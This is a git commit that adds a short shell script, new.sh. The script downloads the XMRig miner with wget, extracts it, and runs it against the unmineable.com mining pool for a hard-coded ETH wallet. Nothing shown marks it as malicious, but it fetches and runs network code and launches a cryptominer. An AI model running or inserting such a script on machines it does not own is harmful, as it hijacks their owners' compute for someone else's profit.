f2a442cd13773e6f98cffa745a522b541c7e0cdf
shelodnleecooper <93858773+shelodnleecooper@users.noreply.github.com>
2021-11-07 13:52:20 +0530

    Create new.sh

---
+++ new.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+	tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+	ls
+	cd xmrig-6.15.0
+	./xmrig -o rx.unmineable.com:3333 -a rx -k -u ETH:0x6638689ce59e25848eA493d2FdF671E43556d09C.gt+50
